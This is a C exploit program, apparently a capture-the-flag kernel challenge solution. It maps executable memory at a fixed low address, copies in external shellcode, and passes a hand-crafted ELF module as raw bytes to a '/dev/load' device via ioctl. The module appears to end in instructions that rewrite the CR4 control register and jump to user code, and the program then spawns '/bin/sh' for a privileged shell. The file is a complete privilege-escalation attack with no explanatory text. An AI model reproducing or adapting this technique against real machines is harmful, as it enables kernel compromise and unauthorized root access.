#include <sys/ipc.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>
#include <err.h>
#include <errno.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <sys/msg.h>

#define try(expr)                                                              \
    ({                                                                         \
        typeof(expr) _r = (expr);                                              \
        ssize_t _i = (ssize_t)_r;                                              \
        if (0 > _i) {                                                          \
            errx(1, #expr "\n^ error at %s:%d: returned %d, %s\n", __FILE__,   \
                 __LINE__, (int)_i, strerror(errno));                               \
        }                                                                      \
        _r;                                                                    \
    })

typedef struct {
    uint8_t *module;
    char *uargs;
} Args;

extern uint8_t userland;
extern uint8_t userland_end;

uint8_t module[] =
{ 127, 69, 76, 70, 2, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 62, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 3, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 200, 0, 0, 0, 0, 0, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 25, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 232, 0, 0, 0, 0, 0, 0, 0, 110, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 103, 110, 117, 46, 108, 105, 110, 107, 111, 110, 99, 101, 46, 116, 104, 105, 115, 95, 109, 111, 100, 117, 108, 101, 0, 0, 0, 0, 0, 1, 0, 144, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 64, 254, 255, 255, 255, 255, 255, 255, 64, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 64, 190, 255, 255, 255, 255, 255, 255, 76, 1, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 1, 0, 0, 0, 188, 15, 0, 0, 0, 0, 0, 0, 56, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 160, 190, 255, 255, 255, 255, 255, 255, 184, 240, 6, 0, 0, 15, 34, 224, 193, 224, 2, 80, 195, 195 };

int main() {
    void *shellcode = try(mmap((void *)0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0));
    memcpy(shellcode, (void *)&userland, &userland_end-&userland);

    int fd = try(open("/dev/load", O_RDWR));
    Args args = { .module = module, .uargs = "" };
    try(ioctl(fd, sizeof(module), &args));

    system("/bin/sh");
}